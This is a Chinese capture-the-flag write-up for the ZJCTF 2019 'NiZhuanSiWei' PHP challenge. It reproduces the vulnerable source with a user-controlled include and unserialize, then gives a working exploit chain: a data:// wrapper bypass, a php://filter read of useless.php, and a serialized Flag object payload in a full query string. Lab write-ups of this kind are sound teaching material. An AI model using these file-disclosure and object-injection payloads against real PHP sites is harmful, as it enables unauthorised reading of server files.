# 原创
：  [ZJCTF 2019]NiZhuanSiWei

# [ZJCTF 2019]NiZhuanSiWei

#### [ZJCTF 2019]NiZhuanSiWei

## 考点

> 
PHP反序列化


## 思路

> 
分析一下题目给的源码<br/> 看源码发现共有三个参数，依次判断<br/> text的内容为welcome to the zjctf，我们可以用data协议<br/> `text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`<br/> file利用正则过滤了flag字符，根据注释，我们需要先读取useless.php中的内容看看<br/> `file=php://filter/read=convert.base64-encode/resource=useless.php`<br/> useless.php告诉我们password参数需要传一个序列化后的内容进去，这里我们可以将s改成S来绕过__tostring()函数<br/> O:4:“Flag”:1:{S:4:“file”;s:8:“flag.php”;}


```
&lt;?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?&gt;

// useless.php
&lt;?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210513221957532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo "&lt;br&gt;";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?&gt;

```

## Payload

```
&lt;?php
class Flag{
	public $file = 'flag.php';

}
echo serialize(new Flag);
?&gt;

O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

```

payload：`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{S:4:"file";s:8:"flag.php";}`

> 
查看网页源码就能发现flag<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513222009487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

